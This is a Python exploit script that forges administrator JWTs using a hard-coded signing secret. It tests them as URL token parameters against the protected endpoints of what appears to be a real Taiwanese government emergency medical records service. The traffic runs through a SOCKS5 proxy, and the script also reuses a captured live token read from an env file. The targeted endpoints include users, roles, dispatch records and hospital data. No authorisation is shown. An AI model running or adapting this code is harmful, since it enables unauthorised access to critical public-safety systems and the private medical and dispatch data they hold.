#!/usr/bin/env python3
"""Phase 64: Exploit JWT token-in-URL bypass - access all protected endpoints."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, base64, hmac, hashlib, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5://202.160.76.154:11085', 'http': 'socks5://202.160.76.154:11085'}
JWT_SECRET = "ru/3xu4dkru4888"

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def forge_jwt(payload_dict):
    header = {"alg": "HS256", "typ": "JWT"}
    h = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = base64url_encode(json.dumps(payload_dict, separators=(',', ':')).encode())
    msg = f"{h}.{p}"
    sig = hmac.new(JWT_SECRET.encode(), msg.encode(), hashlib.sha256).digest()
    return msg + "." + base64url_encode(sig)

now = int(time.time())

EPCR = "https://epcr.tpf.gov.tw:4004"

# Test with different JWT payloads
payloads = {
    "admin_sub1_all_perms": {
        "sub": "1",
        "role": "ADMIN",
        "user": {"role": "ADMIN", "id": 1, "username": "admin"},
        "permissions": ["AUTH_ROLE", "AUTH_USER", "AUTH_PERM", "AUTH_USER_ALL", "AUTH_ALL"],
        "iat": now,
        "exp": now + 3600,
    },
    "admin_sub1063": {
        "sub": "1063",
        "role": "ADMIN",
        "user": {"role": "ADMIN", "id": 1063, "username": "admin"},
        "permissions": ["AUTH_ROLE", "AUTH_USER", "AUTH_PERM"],
        "iat": now,
        "exp": now + 3600,
    },
    "super_admin": {
        "sub": "superadmin",
        "role": "ADMIN",
        "permissions": ["AUTH_ROLE", "AUTH_USER", "AUTH_PERM", "AUTH_USER_ALL"],
        "iat": now,
        "exp": now + 3600,
    },
    "hospital_admin": {
        "sub": "1",
        "role": "ADMIN",
        "permissions": ["AUTH_ROLE", "AUTH_USER", "AUTH_PERM", "EPCR_PAGE_HOSPITAL"],
        "iat": now,
        "exp": now + 3600,
    },
}

# Protected routes found in JS
protected_routes = [
    '/Users', '/Roles', '/Permissions', '/Awarenesses', '/DispatchRecords',
    '/MeasureStatuses', '/config', '/OpManagement/overviewOperatingRoom',
    '/hospital', '/hospitalAbility', '/hospitalCapability', '/hospitalCapabilityList',
    '/hospitalCapabilityListForHealth', '/hospitalChiefComplaint', '/caseList',
    '/dispatch',
]

# Admin-only routes (need AUTH_ROLE permission)
admin_routes = ['/Roles', '/Roles/setRolePermissionMap/', '/Permissions']

print("=== Testing JWT token-in-URL bypass ===")
print(f"JWT Secret: {JWT_SECRET}")
print()

for payload_name, payload in payloads.items():
    jwt = forge_jwt(payload)
    print(f"\n=== Payload: {payload_name} ===")
    print(f"JWT: {jwt[:80]}...")
    
    for route in protected_routes:
        try:
            r = requests.get(f'{EPCR}{route}', proxies=PROXY, verify=False, timeout=10,
                              headers={'User-Agent': 'Mozilla/5.0'},
                              params={'token': jwt})
            
            # Only print non-404, non-401 responses (interesting results)
            if r.status_code in [200, 201]:
                ct = r.headers.get('content-type', '')
                print(f"  GET {route}: {r.status_code} *** SUCCESS *** (ct={ct[:30]})")
                if 'html' not in ct:
                    print(f"    Body: {r.text[:500]}")
            elif r.status_code in [403]:
                print(f"  GET {route}: {r.status_code} - Forbidden (need different permissions)")
        except Exception as e:
            pass
    
    # Only need one working payload - break early if found
    break  # Remove this to test all payloads

# Now try with the original JWT from env file too
print("\n=== Trying with original JWT from env ===")
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe_service119_live.env', 'r') as f:
    env_content = f.read()
original_jwt = re.findall(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', env_content)
if original_jwt:
    original_jwt = original_jwt[0]
    print(f"Original JWT: {original_jwt[:80]}...")
    for route in ['/Users', '/permission', '/role', '/Roles', '/Permissions', '/config', '/Awarenesses']:
        r = requests.get(f'{EPCR}{route}', proxies=PROXY, verify=False, timeout=10,
                          headers={'User-Agent': 'Mozilla/5.0'},
                          params={'token': original_jwt})
        if r.status_code not in [404]:
            print(f"  GET {route} (original JWT): {r.status_code}, len={len(r.text)}")
            if r.status_code == 200:
                print(f"    *** SUCCESS: {r.text[:500]}")
